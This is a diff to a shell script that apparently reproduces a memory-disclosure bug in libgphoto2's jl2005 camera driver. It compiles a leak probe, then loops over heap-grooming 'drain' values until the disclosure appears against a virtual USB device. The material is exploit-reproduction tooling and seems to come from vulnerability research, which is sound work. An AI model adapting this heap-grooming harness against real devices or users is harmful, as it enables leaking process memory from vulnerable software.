@@ -19,7 +19,7 @@ T=$(CDPATH= cd -- "$HERE/.." && pwd)
 ROOT=$(CDPATH= cd -- "$HERE/../../../.." && pwd)
 TARBALL=${TARBALL:-$T/src/libgphoto2-2.5.34.tar.bz2}
 WORK=${WORK:-/tmp/w180-lgp-replay}
-DRAIN=${DRAIN:-30}
+DRAIN=${DRAIN:-}
 TAR_SHA=5df9e774eb4ab6087a193afff84dcafe9f666e3443fe29e73e6779f659ff7f28
 VUSB_SHA=2b744f67e420a1a6addbf04861685c0711b33df36497e93e9267b4a23e57dde6
 OUT=$WORK/replay.out
@@ -69,6 +69,28 @@ gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I"$P/include" \
 	$(pkg-config --cflags glib-2.0) "$T/evidence/replay-stack-leak-probe.c" \
 	-o "$PROBE" -L"$P/lib" -lgphoto2 -lgphoto2_port \
 	$(pkg-config --libs glib-2.0)
+
+# The numeric drain is heap-layout dependent (W174: 22 failed, 23 worked in
+# that tree); select the first value that produces the k=1023 disclosure.
+if [ -z "$DRAIN" ]; then
+	for d in $(seq 20 40); do
+		set +e
+		env CAMLIBS="$P/lib/libgphoto2/2.5.34" \
+			IOLIBS="$P/lib/libgphoto2_port/0.12.2" IOLIBS_PREFIX=vusb \
+			LD_LIBRARY_PATH="$P/lib" M2SHELL_JL2005_VUSB=v \
+			M2SHELL_JL2005_COUNT=1053 M2SHELL_JL2005_LEN=0x3E28 \
+			M2SHELL_VUSB_GUARDS=4 M2SHELL_VUSB_DRAIN="$d" \
+			M2SHELL_JL2005_FILL=0 M2SHELL_JL2005_TOTAL=1 \
+			"$PROBE" usb:001,001 1024 1024 > "$WORK/drain.out" 2>&1
+		set -e
+		if grep -q 'jl_1024.ppm table_k=1023 rc=0 size=16' "$WORK/drain.out"; then
+			DRAIN=$d
+			break
+		fi
+	done
+	[ -n "$DRAIN" ] || { echo "no DRAIN in 20..40 produced the disclosure; see $WORK/drain.out" >&2; exit 2; }
+fi
+echo "selected DRAIN=$DRAIN (heap-layout dependent; override with DRAIN=N)"
 
 : > "$OUT"
 run_env() {
